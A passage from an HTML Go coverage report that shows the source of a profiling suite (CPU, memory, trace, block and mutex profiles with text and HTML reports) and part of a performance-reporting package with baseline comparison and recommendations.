                        EnableBlock:          true,
                        EnableMutex:          true,
                        BlockProfileRate:     1,
                        MutexProfileFraction: 1,
                        GenerateReports:      true,
                        ReportFormat:         "both",
                        AutoCleanup:          true,
                        MaxSessionsToKeep:    10,
                },
                sessionHistory: make([]SessionSummary, 0),
        }
}</span>

// Configure updates the profiling configuration
func (ps *ProfileSuite) Configure(config ProfileConfig) <span class="cov8" title="1">{
        ps.mu.Lock()
        defer ps.mu.Unlock()
        ps.config = config
}</span>

// StartProfiling begins a comprehensive profiling session
func (ps *ProfileSuite) StartProfiling(name string) error <span class="cov8" title="1">{
        ps.mu.Lock()
        defer ps.mu.Unlock()

        if ps.currentSession != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("%w: %s", ErrProfilingSessionActive, ps.currentSession.Name)
        }</span>

        // Create output directory
        <span class="cov8" title="1">sessionDir := filepath.Join(ps.outputDir, fmt.Sprintf("%s_%s", name, time.Now().Format("20060102_150405")))
        if err := os.MkdirAll(sessionDir, 0o750); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to create session directory: %w", err)
        }</span>

        <span class="cov8" title="1">session := &amp;ComprehensiveSession{
                Name:      name,
                StartTime: time.Now(),
                OutputDir: sessionDir,
        }

        // Enable profiling for the session
        if err := ps.enableProfiling(); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to enable profiling: %w", err)
        }</span>

        // Start profiling components
        <span class="cov8" title="1">if err := ps.startSession(session); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to start profiling session: %w", err)
        }</span>

        <span class="cov8" title="1">ps.currentSession = session
        return nil</span>
}

// StopProfiling stops the current profiling session and generates reports
func (ps *ProfileSuite) StopProfiling() error <span class="cov8" title="1">{
        return ps.stopProfilingWithContext(context.Background())
}</span>

// stopProfilingWithContext stops the current profiling session and generates reports with context
func (ps *ProfileSuite) stopProfilingWithContext(ctx context.Context) error <span class="cov8" title="1">{
        ps.mu.Lock()
        defer ps.mu.Unlock()

        if ps.currentSession == nil </span><span class="cov8" title="1">{
                return ErrNoActiveSession
        }</span>

        <span class="cov8" title="1">session := ps.currentSession

        // Stop profiling components
        if err := ps.stopSession(session); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to stop profiling session: %w", err)
        }</span>

        // Generate reports if enabled
        <span class="cov8" title="1">if ps.config.GenerateReports </span><span class="cov8" title="1">{
                if err := ps.generateReports(ctx, session); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to generate reports: %w", err)
                }</span>
        }

        // Add to session history
        <span class="cov8" title="1">summary := ps.createSessionSummary(session)
        ps.sessionHistory = append(ps.sessionHistory, summary)

        // Cleanup old sessions if enabled
        if ps.config.AutoCleanup </span><span class="cov8" title="1">{
                ps.cleanupOldSessions()
        }</span>

        <span class="cov8" title="1">ps.currentSession = nil
        return nil</span>
}

// ProfileWithFunc runs a function while profiling it comprehensively
func (ps *ProfileSuite) ProfileWithFunc(name string, fn func() error) error <span class="cov8" title="1">{
        if err := ps.StartProfiling(name); err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{
                if stopErr := ps.StopProfiling(); stopErr != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to stop profiling: %v\n", stopErr)
                }</span>
        }()

        <span class="cov8" title="1">return fn()</span>
}

// ProfileWithContext runs a function with context while profiling
func (ps *ProfileSuite) ProfileWithContext(ctx context.Context, name string, fn func(context.Context) error) error <span class="cov8" title="1">{
        if err := ps.StartProfiling(name); err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{
                if stopErr := ps.stopProfilingWithContext(ctx); stopErr != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to stop profiling: %v\n", stopErr)
                }</span>
        }()

        <span class="cov8" title="1">return fn(ctx)</span>
}

// enableProfiling enables the required profiling types
func (ps *ProfileSuite) enableProfiling() error <span class="cov8" title="1">{
        // Enable memory profiler
        if ps.config.EnableMemory </span><span class="cov8" title="1">{
                if err := ps.memProfiler.Enable(); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to enable memory profiler: %w", err)
                }</span>
        }

        // Enable block profiling
        <span class="cov8" title="1">if ps.config.EnableBlock &amp;&amp; ps.config.BlockProfileRate &gt; 0 </span><span class="cov8" title="1">{
                runtime.SetBlockProfileRate(ps.config.BlockProfileRate)
        }</span>

        // Enable mutex profiling
        <span class="cov8" title="1">if ps.config.EnableMutex &amp;&amp; ps.config.MutexProfileFraction &gt; 0 </span><span class="cov8" title="1">{
                runtime.SetMutexProfileFraction(ps.config.MutexProfileFraction)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// startSession starts all enabled profiling types for a session
func (ps *ProfileSuite) startSession(session *ComprehensiveSession) error <span class="cov8" title="1">{
        session.mu.Lock()
        defer session.mu.Unlock()

        if session.started </span><span class="cov0" title="0">{
                return ErrSessionAlreadyStarted
        }</span>

        // Capture initial memory snapshot
        <span class="cov8" title="1">session.startSnapshot = CaptureMemStats(fmt.Sprintf("%s_start", session.Name))

        // Start CPU profiling
        if ps.config.EnableCPU </span><span class="cov8" title="1">{
                cpuFile := filepath.Join(session.OutputDir, "cpu.prof")
                cpu, err := os.Create(cpuFile) //nolint:gosec // Creating profile output file
                if err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to create CPU profile file: %w", err)
                }</span>
                <span class="cov8" title="1">session.cpuFile = cpu

                if err := pprof.StartCPUProfile(cpu); err != nil </span><span class="cov0" title="0">{
                        _ = cpu.Close() // Ignore error during cleanup
                        return fmt.Errorf("failed to start CPU profiling: %w", err)
                }</span>
        }

        // Start memory profiling session
        <span class="cov8" title="1">if ps.config.EnableMemory </span><span class="cov8" title="1">{
                memSession, err := ps.memProfiler.StartProfiling(session.Name)
                if err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to start memory profiling: %w", err)
                }</span>
                <span class="cov8" title="1">session.memSession = memSession</span>
        }

        // Start execution trace
        <span class="cov8" title="1">if ps.config.EnableTrace </span><span class="cov0" title="0">{
                traceFile := filepath.Join(session.OutputDir, "trace.out")
                traceF, err := os.Create(traceFile) //nolint:gosec // Creating trace output file
                if err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to create trace file: %w", err)
                }</span>
                <span class="cov0" title="0">session.traceFile = traceF

                if err := trace.Start(traceF); err != nil </span><span class="cov0" title="0">{
                        _ = traceF.Close() // Ignore error during cleanup
                        return fmt.Errorf("failed to start execution trace: %w", err)
                }</span>
        }

        // Prepare additional profile file paths
        <span class="cov8" title="1">session.goroutineFile = filepath.Join(session.OutputDir, "goroutine.prof")
        session.blockFile = filepath.Join(session.OutputDir, "block.prof")
        session.mutexFile = filepath.Join(session.OutputDir, "mutex.prof")
        session.allocsFile = filepath.Join(session.OutputDir, "allocs.prof")

        session.started = true
        return nil</span>
}

// stopSession stops all profiling for a session
func (ps *ProfileSuite) stopSession(session *ComprehensiveSession) error <span class="cov8" title="1">{
        session.mu.Lock()
        defer session.mu.Unlock()

        if !session.started || session.stopped </span><span class="cov0" title="0">{
                return nil
        }</span>

        // Stop CPU profiling
        <span class="cov8" title="1">if ps.config.EnableCPU &amp;&amp; session.cpuFile != nil </span><span class="cov8" title="1">{
                pprof.StopCPUProfile()
                _ = session.cpuFile.Close() // Ignore error during cleanup
        }</span>

        // Stop memory profiling session
        <span class="cov8" title="1">if ps.config.EnableMemory &amp;&amp; session.memSession != nil </span><span class="cov8" title="1">{
                if err := ps.memProfiler.StopProfiling(session.memSession.Name); err != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to stop memory profiling: %v\n", err)
                }</span>
        }

        // Stop execution trace
        <span class="cov8" title="1">if ps.config.EnableTrace &amp;&amp; session.traceFile != nil </span><span class="cov0" title="0">{
                trace.Stop()
                _ = session.traceFile.Close() // Ignore error during cleanup
        }</span>

        // Capture additional profiles
        <span class="cov8" title="1">ps.captureAdditionalProfiles(session)

        // Capture final memory snapshot
        session.endSnapshot = CaptureMemStats(fmt.Sprintf("%s_end", session.Name))

        session.stopped = true
        return nil</span>
}

// captureAdditionalProfiles captures goroutine, block, mutex, and allocs profiles
func (ps *ProfileSuite) captureAdditionalProfiles(session *ComprehensiveSession) <span class="cov8" title="1">{
        profiles := []struct {
                name     string
                filename string
                debug    int
                enabled  bool
        }{
                {"goroutine", session.goroutineFile, 1, true},
                {"block", session.blockFile, 1, ps.config.EnableBlock},
                {"mutex", session.mutexFile, 1, ps.config.EnableMutex},
                {"allocs", session.allocsFile, 0, ps.config.EnableMemory},
        }

        for _, profileInfo := range profiles </span><span class="cov8" title="1">{
                if !profileInfo.enabled </span><span class="cov8" title="1">{
                        continue</span>
                }

                <span class="cov8" title="1">profile := pprof.Lookup(profileInfo.name)
                if profile == nil </span><span class="cov0" title="0">{
                        continue</span>
                }

                <span class="cov8" title="1">f, err := os.Create(profileInfo.filename)
                if err != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to create %s profile file: %v\n", profileInfo.name, err)
                        continue</span>
                }

                <span class="cov8" title="1">if err := profile.WriteTo(f, profileInfo.debug); err != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to write %s profile: %v\n", profileInfo.name, err)
                }</span>

                <span class="cov8" title="1">_ = f.Close()</span> // Ignore error during cleanup
        }
}

// generateReports generates comprehensive analysis reports
func (ps *ProfileSuite) generateReports(ctx context.Context, session *ComprehensiveSession) error <span class="cov8" title="1">{
        if ps.config.ReportFormat == "text" || ps.config.ReportFormat == "both" </span><span class="cov8" title="1">{
                if err := ps.generateTextReport(session); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to generate text report: %w", err)
                }</span>
        }

        <span class="cov8" title="1">if ps.config.ReportFormat == "html" || ps.config.ReportFormat == "both" </span><span class="cov8" title="1">{
                if err := ps.generateHTMLReport(ctx, session); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to generate HTML report: %w", err)
                }</span>
        }

        <span class="cov8" title="1">return nil</span>
}

// generateTextReport creates a comprehensive text report
func (ps *ProfileSuite) generateTextReport(session *ComprehensiveSession) error <span class="cov8" title="1">{
        reportFile := filepath.Join(session.OutputDir, "comprehensive_report.txt")

        f, err := os.Create(reportFile) //nolint:gosec // Creating report output file
        if err != nil </span><span class="cov0" title="0">{
                return err
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{ _ = f.Close() }</span>() // Ignore error in defer

        <span class="cov8" title="1">duration := time.Since(session.StartTime)

        // Report header
        writeToReport(f, "Comprehensive Profiling Report\n")
        writeToReport(f, "==============================\n\n")
        writeToReport(f, "Session: %s\n", session.Name)
        writeToReport(f, "Start Time: %s\n", session.StartTime.Format(time.RFC3339))
        writeToReport(f, "Duration: %s\n", duration)
        writeToReport(f, "Output Directory: %s\n\n", session.OutputDir)

        // Configuration
        writeToReport(f, "Configuration\n")
        writeToReport(f, "-------------\n")
        writeToReport(f, "CPU Profiling: %t\n", ps.config.EnableCPU)
        writeToReport(f, "Memory Profiling: %t\n", ps.config.EnableMemory)
        writeToReport(f, "Execution Trace: %t\n", ps.config.EnableTrace)
        writeToReport(f, "Block Profiling: %t (rate: %d)\n", ps.config.EnableBlock, ps.config.BlockProfileRate)
        writeToReport(f, "Mutex Profiling: %t (fraction: %d)\n", ps.config.EnableMutex, ps.config.MutexProfileFraction)
        writeToReport(f, "\n")

        // Memory analysis
        if session.endSnapshot.Label != "" </span><span class="cov8" title="1">{
                comparison := session.startSnapshot.Compare(session.endSnapshot)
                writeToReport(f, "Memory Analysis\n")
                writeToReport(f, "---------------\n")
                writeToReport(f, "%s\n", comparison.String())
        }</span>

        // Profile files summary
        <span class="cov8" title="1">writeToReport(f, "Generated Profile Files\n")
        writeToReport(f, "-----------------------\n")

        profileFiles := []string{
                "cpu.prof",
                "trace.out",
                "goroutine.prof",
                "block.prof",
                "mutex.prof",
                "allocs.prof",
        }

        for _, filename := range profileFiles </span><span class="cov8" title="1">{
                filePath := filepath.Join(session.OutputDir, filename)
                if info, err := os.Stat(filePath); err == nil </span><span class="cov8" title="1">{
                        writeToReport(f, "%s: %s (%s)\n", filename, formatBytes(uint64(info.Size())), info.ModTime().Format(time.RFC3339)) //nolint:gosec // File size unlikely to overflow
                }</span>
        }

        // Analysis commands
        <span class="cov8" title="1">writeToReport(f, "\nAnalysis Commands\n")
        writeToReport(f, "-----------------\n")

        if ps.config.EnableCPU </span><span class="cov0" title="0">{
                writeToReport(f, "CPU Profile Analysis:\n")
                writeToReport(f, "  go tool pprof -top %s\n", filepath.Join(session.OutputDir, "cpu.prof"))
                writeToReport(f, "  go tool pprof -web %s\n", filepath.Join(session.OutputDir, "cpu.prof"))
        }</span>

        <span class="cov8" title="1">if ps.config.EnableTrace </span><span class="cov0" title="0">{
                writeToReport(f, "\nExecution Trace Analysis:\n")
                writeToReport(f, "  go tool trace %s\n", filepath.Join(session.OutputDir, "trace.out"))
        }</span>

        <span class="cov8" title="1">if ps.config.EnableBlock </span><span class="cov8" title="1">{
                writeToReport(f, "\nBlock Profile Analysis:\n")
                writeToReport(f, "  go tool pprof -top %s\n", filepath.Join(session.OutputDir, "block.prof"))
        }</span>

        <span class="cov8" title="1">if ps.config.EnableMutex </span><span class="cov8" title="1">{
                writeToReport(f, "\nMutex Profile Analysis:\n")
                writeToReport(f, "  go tool pprof -top %s\n", filepath.Join(session.OutputDir, "mutex.prof"))
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// generateHTMLReport creates an HTML report using go tool pprof
func (ps *ProfileSuite) generateHTMLReport(ctx context.Context, session *ComprehensiveSession) error <span class="cov8" title="1">{
        if !ps.config.EnableCPU </span><span class="cov8" title="1">{
                return nil // Skip HTML report if no CPU profile
        }</span>

        <span class="cov8" title="1">cpuProfile := filepath.Join(session.OutputDir, "cpu.prof")
        htmlReport := filepath.Join(session.OutputDir, "cpu_profile.html")

        // Check if CPU profile exists and has content before generating HTML report
        if info, err := os.Stat(cpuProfile); err != nil || info.Size() == 0 </span><span class="cov0" title="0">{
                // Create a placeholder HTML report if no valid CPU profile exists
                placeholder := `&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;CPU Profile Report&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;CPU Profile Report&lt;/h1&gt;
&lt;p&gt;No CPU profile data available for session: ` + session.Name + `&lt;/p&gt;
&lt;p&gt;This may be because the profiled function executed too quickly to capture meaningful CPU profile data.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;`
                return os.WriteFile(htmlReport, []byte(placeholder), 0o644) //nolint:gosec // HTML report file with standard permissions
        }</span>

        // Use a simpler pprof command that generates SVG instead of starting HTTP server
        <span class="cov8" title="1">cmd := exec.CommandContext(ctx, "go", "tool", "pprof", "-svg", "-output", htmlReport+".svg", cpuProfile) //nolint:gosec // Go pprof tool with controlled arguments

        if err := cmd.Run(); err != nil </span><span class="cov8" title="1">{
                // If SVG generation fails, create a simple HTML report with text output
                textReport := filepath.Join(session.OutputDir, "cpu_profile.txt")
                textCmd := exec.CommandContext(ctx, "go", "tool", "pprof", "-text", "-output", textReport, cpuProfile) //nolint:gosec // Go pprof tool with controlled arguments

                if textErr := textCmd.Run(); textErr != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to generate HTML or text report: HTML error: %w, Text error: %w", err, textErr)
                }</span>

                // Create HTML wrapper for text report
                <span class="cov8" title="1">if textContent, readErr := os.ReadFile(textReport); readErr == nil </span><span class="cov8" title="1">{ //nolint:gosec // Reading generated text report file
                        htmlContent := `&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;CPU Profile Report&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;CPU Profile Report - ` + session.Name + `&lt;/h1&gt;
&lt;pre&gt;` + string(textContent) + `&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;`
                        return os.WriteFile(htmlReport, []byte(htmlContent), 0o644) //nolint:gosec // HTML report file with standard permissions
                }</span>

                <span class="cov0" title="0">return fmt.Errorf("failed to generate HTML report and read text report: %w", err)</span>
        }

        <span class="cov0" title="0">return nil</span>
}

// createSessionSummary creates a summary of the completed session
func (ps *ProfileSuite) createSessionSummary(session *ComprehensiveSession) SessionSummary <span class="cov8" title="1">{
        duration := time.Since(session.StartTime)

        // Count profile files and calculate total size
        fileCount := 0
        totalSize := int64(0)

        profileFiles := []string{
                "cpu.prof", "trace.out", "goroutine.prof",
                "block.prof", "mutex.prof", "allocs.prof",
                "comprehensive_report.txt", "cpu_profile.html",
        }

        profileTypes := make([]string, 0)

        for _, filename := range profileFiles </span><span class="cov8" title="1">{
                filePath := filepath.Join(session.OutputDir, filename)
                if info, err := os.Stat(filePath); err == nil </span><span class="cov8" title="1">{
                        fileCount++
                        totalSize += info.Size()

                        // Add to profile types
                        ext := strings.TrimSuffix(filename, filepath.Ext(filename))
                        profileTypes = append(profileTypes, ext)
                }</span>
        }

        <span class="cov8" title="1">return SessionSummary{
                Name:         session.Name,
                StartTime:    session.StartTime,
                Duration:     duration,
                OutputDir:    session.OutputDir,
                ProfileTypes: profileTypes,
                FileCount:    fileCount,
                TotalSize:    totalSize,
        }</span>
}

// cleanupOldSessions removes old profiling sessions to save disk space
func (ps *ProfileSuite) cleanupOldSessions() <span class="cov8" title="1">{
        if len(ps.sessionHistory) &lt;= ps.config.MaxSessionsToKeep </span><span class="cov8" title="1">{
                return
        }</span>

        // Remove oldest sessions
        <span class="cov8" title="1">toRemove := len(ps.sessionHistory) - ps.config.MaxSessionsToKeep
        for i := 0; i &lt; toRemove; i++ </span><span class="cov8" title="1">{
                session := ps.sessionHistory[i]
                if err := os.RemoveAll(session.OutputDir); err != nil </span><span class="cov8" title="1">{
                        log.Printf("Warning: failed to cleanup session directory %s: %v\n", session.OutputDir, err)
                }</span>
        }

        // Update session history
        <span class="cov8" title="1">ps.sessionHistory = ps.sessionHistory[toRemove:]</span>
}

// GetSessionHistory returns the history of profiling sessions
func (ps *ProfileSuite) GetSessionHistory() []SessionSummary <span class="cov8" title="1">{
        ps.mu.RLock()
        defer ps.mu.RUnlock()

        // Return a copy to prevent external modification
        history := make([]SessionSummary, len(ps.sessionHistory))
        copy(history, ps.sessionHistory)
        return history
}</span>

// GetCurrentSession returns information about the current profiling session
func (ps *ProfileSuite) GetCurrentSession() *ComprehensiveSession <span class="cov8" title="1">{
        ps.mu.RLock()
        defer ps.mu.RUnlock()

        return ps.currentSession
}</span>

// IsActive returns true if a profiling session is currently active
func (ps *ProfileSuite) IsActive() bool <span class="cov8" title="1">{
        ps.mu.RLock()
        defer ps.mu.RUnlock()

        return ps.currentSession != nil
}</span>
</pre>

		<pre class="file" id="file47" style="display: none">// Package reporting provides performance analysis and reporting functionality for the broadcast system.
package reporting

import (
        "encoding/json"
        "errors"
        "fmt"
        "os"
        "path/filepath"
        "runtime"
        "sort"
        "strings"
        "text/template"
        "time"
)

// Reporting errors
var (
        ErrBaselineNotFound = errors.New("baseline file not found")
)

// PerformanceReport represents a comprehensive performance analysis report
type PerformanceReport struct {
        Timestamp       time.Time          `json:"timestamp"`
        ReportID        string             `json:"report_id"`
        Version         string             `json:"version"`
        BaselineMetrics map[string]float64 `json:"baseline_metrics"`
        CurrentMetrics  map[string]float64 `json:"current_metrics"`
        Improvements    map[string]float64 `json:"improvements"`
        Regressions     map[string]float64 `json:"regressions"`
        Recommendations []Recommendation   `json:"recommendations"`
        SystemInfo      SystemInfo         `json:"system_info"`
        TestResults     []TestResult       `json:"test_results"`
        ProfileSummary  ProfileSummary     `json:"profile_summary"`

        // Metadata
        Duration    time.Duration `json:"duration"`
        TotalTests  int           `json:"total_tests"`
        PassedTests int           `json:"passed_tests"`
        FailedTests int           `json:"failed_tests"`
}

// Recommendation represents a performance optimization recommendation
type Recommendation struct {
        ID          string                 `json:"id"`
        Priority    RecommendationPriority `json:"priority"`
        Category    string                 `json:"category"`
        Title       string                 `json:"title"`
        Description string                 `json:"description"`
        Action      string                 `json:"action"`
        Impact      string                 `json:"impact"`
        Evidence    []string               `json:"evidence"`
        References  []string               `json:"references,omitempty"`
}

// RecommendationPriority defines recommendation priority levels
type RecommendationPriority string

const (
        // PriorityHigh indicates high-priority recommendations that should be addressed immediately
        PriorityHigh RecommendationPriority = "high"
        // PriorityMedium indicates medium-priority recommendations that should be addressed soon
        PriorityMedium RecommendationPriority = "medium"
        // PriorityLow indicates low-priority recommendations that can be addressed when convenient
        PriorityLow RecommendationPriority = "low"
)

// SystemInfo contains system information for the report
type SystemInfo struct {
        GoVersion  string    `json:"go_version"`
        GOOS       string    `json:"goos"`
        GOARCH     string    `json:"goarch"`
        NumCPU     int       `json:"num_cpu"`
        GOMAXPROCS int       `json:"gomaxprocs"`
        Timestamp  time.Time `json:"timestamp"`
}

// TestResult represents the result of a performance test
type TestResult struct {
        Name       string        `json:"name"`
        Duration   time.Duration `json:"duration"`
        Success    bool          `json:"success"`
        Throughput float64       `json:"throughput"`
        MemoryUsed int64         `json:"memory_used_mb"`
        Error      string        `json:"error,omitempty"`
}

// ProfileSummary contains summary information from profiling
type ProfileSummary struct {
        CPUProfile       ProfileInfo `json:"cpu_profile"`
        MemoryProfile    ProfileInfo `json:"memory_profile"`
        GoroutineProfile ProfileInfo `json:"goroutine_profile"`
        TotalProfileSize int64       `json:"total_profile_size_bytes"`
}

// ProfileInfo contains information about a specific profile
type ProfileInfo struct {
        Available bool   `json:"available"`
        Size      int64  `json:"size_bytes"`
        Path      string `json:"path,omitempty"`
}

// ReportConfig configures report generation
type ReportConfig struct {
        OutputDirectory     string                 `json:"output_directory"`
        BaselineFile        string                 `json:"baseline_file"`
        IncludeProfiles     bool                   `json:"include_profiles"`
        GenerateHTML        bool                   `json:"generate_html"`
        GenerateJSON        bool                   `json:"generate_json"`
        GenerateMarkdown    bool                   `json:"generate_markdown"`
        ComparisonThreshold float64                `json:"comparison_threshold"`
        CustomMetrics       map[string]interface{} `json:"custom_metrics,omitempty"`
}

// DefaultReportConfig returns default report configuration
func DefaultReportConfig() ReportConfig <span class="cov8" title="1">{
        return ReportConfig{
                OutputDirectory:     "./reports",
                BaselineFile:        "baseline.json",
                IncludeProfiles:     true,
                GenerateHTML:        true,
                GenerateJSON:        true,
                GenerateMarkdown:    true,
                ComparisonThreshold: 5.0, // 5% threshold for significance
        }
}</span>

// PerformanceReporter manages performance report generation
type PerformanceReporter struct {
        config   ReportConfig
        baseline *PerformanceReport
}

// NewPerformanceReporter creates a new performance reporter
func NewPerformanceReporter(config ReportConfig) *PerformanceReporter <span class="cov8" title="1">{
        return &amp;PerformanceReporter{
                config: config,
        }
}</span>

// LoadBaseline loads baseline metrics from file
func (pr *PerformanceReporter) LoadBaseline() error <span class="cov8" title="1">{
        baselinePath := filepath.Join(pr.config.OutputDirectory, pr.config.BaselineFile)

        data, err := os.ReadFile(baselinePath) //nolint:gosec // Reading from configured baseline file path
        if err != nil </span><span class="cov8" title="1">{
                if os.IsNotExist(err) </span><span class="cov8" title="1">{
                        return fmt.Errorf("%w: %s", ErrBaselineNotFound, baselinePath)
                }</span>
                <span class="cov0" title="0">return fmt.Errorf("failed to read baseline file: %w", err)</span>
        }

        <span class="cov8" title="1">var baseline PerformanceReport
        if err := json.Unmarshal(data, &amp;baseline); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to parse baseline file: %w", err)
        }</span>

        <span class="cov8" title="1">pr.baseline = &amp;baseline
        return nil</span>
}

// SaveBaseline saves current metrics as baseline
func (pr *PerformanceReporter) SaveBaseline(report *PerformanceReport) error <span class="cov8" title="1">{
        if err := os.MkdirAll(pr.config.OutputDirectory, 0o750); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to create output directory: %w", err)
        }</span>

        <span class="cov8" title="1">baselinePath := filepath.Join(pr.config.OutputDirectory, pr.config.BaselineFile)

        data, err := json.MarshalIndent(report, "", "  ")
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to marshal baseline: %w", err)
        }</span>

        <span class="cov8" title="1">if err := os.WriteFile(baselinePath, data, 0o600); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to write baseline file: %w", err)
        }</span>

        <span class="cov8" title="1">pr.baseline = report
        return nil</span>
}

// GenerateReport creates a comprehensive performance report
func (pr *PerformanceReporter) GenerateReport(currentMetrics map[string]float64, testResults []TestResult, profileSummary ProfileSummary) (*PerformanceReport, error) <span class="cov8" title="1">{
        report := &amp;PerformanceReport{
                Timestamp:      time.Now(),
                ReportID:       generateReportID(),
                Version:        "1.0",
                CurrentMetrics: currentMetrics,
                Improvements:   make(map[string]float64),
                Regressions:    make(map[string]float64),
                TestResults:    testResults,
                ProfileSummary: profileSummary,
                SystemInfo:     getSystemInfo(),
        }

        // Add custom metrics if configured
        if pr.config.CustomMetrics != nil </span><span class="cov8" title="1">{
                for key, value := range pr.config.CustomMetrics </span><span class="cov8" title="1">{
                        if floatVal, ok := value.(float64); ok </span><span class="cov8" title="1">{
                                report.CurrentMetrics[key] = floatVal
                        }</span>
                }
        }

        // Calculate test statistics
        <span class="cov8" title="1">report.TotalTests = len(testResults)
        for _, result := range testResults </span><span class="cov8" title="1">{
                if result.Success </span><span class="cov8" title="1">{
                        report.PassedTests++
                }</span> else<span class="cov8" title="1"> {
                        report.FailedTests++
                }</span>
        }

        // Compare with baseline if available
        <span class="cov8" title="1">if pr.baseline != nil </span><span class="cov8" title="1">{
                report.BaselineMetrics = pr.baseline.CurrentMetrics
                pr.calculatePerformanceChanges(report)
        }</span>

        // Generate recommendations
        <span class="cov8" title="1">report.Recommendations = pr.generateRecommendations(report)

        return report, nil</span>
}

// calculatePerformanceChanges compares current metrics with baseline
func (pr *PerformanceReporter) calculatePerformanceChanges(report *PerformanceReport) <span class="cov8" title="1">{
        for metric, currentValue := range report.CurrentMetrics </span><span class="cov8" title="1">{
                if baselineValue, exists := report.BaselineMetrics[metric]; exists </span><span class="cov8" title="1">{
                        change := ((currentValue - baselineValue) / baselineValue) * 100

                        if abs(change) &gt;= pr.config.ComparisonThreshold </span><span class="cov8" title="1">{
                                if change &lt; 0 </span><span class="cov8" title="1">{
                                        // Negative change is improvement for metrics like duration, memory usage
                                        if isLowerBetterMetric(metric) </span><span class="cov8" title="1">{
                                                report.Improvements[metric] = abs(change)
                                        }</span> else<span class="cov0" title="0"> {
                                                report.Regressions[metric] = abs(change)
                                        }</span>
                                } else<span class="cov8" title="1"> {
                                        // Positive change is improvement for metrics like throughput
                                        if isHigherBetterMetric(metric) </span><span class="cov8" title="1">{
                                                report.Improvements[metric] = change
                                        }</span> else<span class="cov8" title="1"> {
                                                report.Regressions[metric] = change
                                        }</span>
                                }
                        }
                }
        }
}

// generateRecommendations creates performance optimization recommendations
func (pr *PerformanceReporter) generateRecommendations(report *PerformanceReport) []Recommendation <span class="cov8" title="1">{
        var recommendations []Recommendation

        // Memory-related recommendations
        recommendations = append(recommendations, pr.analyzeMemoryMetrics(report)...)

        // Performance regression recommendations
        recommendations = append(recommendations, pr.analyzeRegressions(report)...)

        // Test failure recommendations
        recommendations = append(recommendations, pr.analyzeTestFailures(report)...)

        // Profile-based recommendations
        recommendations = append(recommendations, pr.analyzeProfiles(report)...)

        // Sort by priority
        sort.Slice(recommendations, func(i, j int) bool </span><span class="cov8" title="1">{
                priorityOrder := map[RecommendationPriority]int{
                        PriorityHigh:   3,
                        PriorityMedium: 2,
                        PriorityLow:    1,
                }
                return priorityOrder[recommendations[i].Priority] &gt; priorityOrder[recommendations[j].Priority]
        }</span>)

        <span class="cov8" title="1">return recommendations</span>
}

// analyzeMemoryMetrics generates memory-related recommendations
func (pr *PerformanceReporter) analyzeMemoryMetrics(report *PerformanceReport) []Recommendation <span class="cov8" title="1">{
        var recommendations []Recommendation

        // Check memory usage
        if memUsage, exists := report.CurrentMetrics["memory_usage_mb"]; exists &amp;&amp; memUsage &gt; 500 </span><span class="cov8" title="1">{
                recommendations = append(recommendations, Recommendation{
                        ID:          "mem-high-usage",
                        Priority:    PriorityHigh,
                        Category:    "Memory",
                        Title:       "High Memory Usage Detected",
                        Description: fmt.Sprintf("Current memory usage is %.1f MB, which is above the recommended threshold", memUsage),
                        Action:      "Consider implementing more aggressive memory pooling or review memory allocation patterns",
                        Impact:      "High memory usage can lead to GC pressure and reduced performance",
                        Evidence:    []string{fmt.Sprintf("Memory usage: %.1f MB", memUsage)},
                })
        }</span>

        // Check memory growth
        <span class="cov8" title="1">if pr.baseline != nil </span><span class="cov8" title="1">{
                if currentMem, exists := report.CurrentMetrics["memory_usage_mb"]; exists </span><span class="cov8" title="1">{
                        if baselineMem, exists := report.BaselineMetrics["memory_usage_mb"]; exists </span><span class="cov8" title="1">{
                                growth := ((currentMem - baselineMem) / baselineMem) * 100
                                if growth &gt; 20 </span><span class="cov8" title="1">{
                                        recommendations = append(recommendations, Recommendation{
                                                ID:          "mem-growth",
                                                Priority:    PriorityMedium,
                                                Category:    "Memory",
                                                Title:       "Memory Usage Growth",
                                                Description: fmt.Sprintf("Memory usage has increased by %.1f%% since baseline", growth),
                                                Action:      "Investigate potential memory leaks or inefficient allocation patterns",
                                                Impact:      "Memory growth may indicate memory leaks or inefficient resource usage",
                                                Evidence: []string{
                                                        fmt.Sprintf("Current: %.1f MB", currentMem),
                                                        fmt.Sprintf("Baseline: %.1f MB", baselineMem),
                                                        fmt.Sprintf("Growth: %.1f%%", growth),
                                                },
                                        })
                                }</span>
                        }
                }
        }

        <span class="cov8" title="1">return recommendations</span>
}

